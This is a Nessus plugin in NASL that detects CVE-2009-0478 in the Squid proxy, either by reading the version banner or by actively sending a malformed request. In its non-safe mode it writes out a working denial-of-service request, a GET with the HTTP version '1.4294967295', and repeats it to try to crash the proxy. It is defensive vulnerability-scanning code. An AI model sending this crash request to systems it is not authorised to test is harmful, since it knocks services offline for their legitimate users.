#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35620);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2009-0478");
  script_bugtraq_id(33604);
  script_osvdb_id(51810);
  script_xref(name:"Secunia", value:"33731");

  script_name(english:"Squid < 2.7.STABLE6 / 3.0.STABLE13 / 3.1.0.5 HTTP Version Number Request Remote DoS");
  script_summary(english:"Checks version of Squid");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote proxy server is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The version of the Squid proxy caching server installed on the remote
host may abort when parsing requests with an invalid HTTP version.  A
remote attacker may be able to leverage this issue to crash the
application, thereby denying service to legitimate users. 

Note that successful exploitation of this issue requires that Squid
was not built with the 'NODEBUG' define." );
 script_set_attribute(attribute:"see_also", value:"http://www.squid-cache.org/Advisories/SQUID-2009_1.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500653/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Either apply the appropriate patches referenced in the project's
advisory above or upgrade to Squid version 2.7.STABLE6 / 3.0.STABLE13
/ 3.1.0.5 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/02/09");
 script_cvs_date("$Date: 2016/05/12 14:55:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:squid-cache:squid");
script_end_attributes();

 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Firewalls");
  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");
  script_dependencies("proxy_use.nasl");
  script_require_ports("Services/http_proxy", 3128, 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


ports = add_port_in_list(list:get_kb_list("Services/http_proxy"), port:3128);
ports = add_port_in_list(list:ports, port:8080);

foreach port (ports)
{
  if (!get_port_state(port)) continue;

  # Extract the banner.
  res = http_get_cache(item:"/", port:port);
  if (isnull(res)) continue;

  # If it's for Squid...
  if ("Squid/" >< res || "squid/" >< res)
  {
    if (safe_checks())
    {
      # nb: banner checks of open source software are prone to false-
      #     positives so only run the check if reporting is paranoid.
      if (report_paranoia > 1)
      {
        # Extract the version number.
        version = NULL;

        pat = "([Ss]quid/([0-9]+\.[^ \)]+))";
        matches = egrep(pattern:pat, string:res);
        if (matches)
        {
          foreach match (split(matches, keep:FALSE))
          {
            item = eregmatch(pattern:pat, string:match);
            if (!isnull(item))
            {
              version = item[2];
              break;
            }
          }
        }

        # Affected versions:      Squid 2.7 -> 2.7.STABLE5,
        #                         Squid 3.0 -> 3.0.STABLE12,
        #                         Squid 3.1 -> 3.1.0.4
        # Fixed in version:       Squid 2.7.STABLE6, 3.0.STABLE13, 3.1.0.5
        if (version && version =~ "^(2\.7\.STABLE[0-5]|3\.0\.STABLE([0-9]|1[0-2])|3\.1\.0\.[0-3])([^0-9]|$)")
        {
          if (report_verbosity > 0)
          {
            report = string(
              "\n",
              "Squid version ", version, " appears to be running on the remote host\n",
              "based on the following line :\n",
              "\n",
              "  ", match, "\n",
              "\n",
              "Note that Nessus has not actually attempted to exploit this issue nor\n",
              "determine if the Squid daemon was built with the 'NODEBUG' define so\n",
              "this may be a false-positive.\n"
            );
            security_warning(port:port, extra:report);
          }
          else security_warning(port);
        }
      }
      continue;
    }
    else
    {
      if (http_is_dead(port:port)) continue;

      # Define an evil request.
      http_version = string("1.4294967295");
      req = string(
        "GET http://www.nessus.org/ HTTP/", http_version, "\r\n",
        "Host: www.nessus.org\r\n",
        "\r\n"
      );

      # Try several times to crash the daemon or get no response out of it.
      #
      # nb: typically, the child will abort and be restarted by the parent.
      max_tries = 5;
      responses = 0;
      for (i=0; i<max_tries; i++)
      {
        soc = http_open_socket(port);
        if (!soc) break;

        send(socket:soc, data:req);
        res = http_recv3(socket:soc);
        http_close_socket(soc);

        if (! isnull(res))
        {
          responses++;
          break;
        }
      }

      # There's a response if we didn't get a response at all.
      if (responses == 0)
      {
        if (report_verbosity > 0)
        {
          report = string(
            "\n",
            "Nessus sent the following request and either crashed the remote proxy\n",
            "or failed to get a response after ", max_tries, " attempts :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            req,
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
          security_warning(port:port, extra:report);
        }
        else security_warning(port);
      }
    }
  }
}
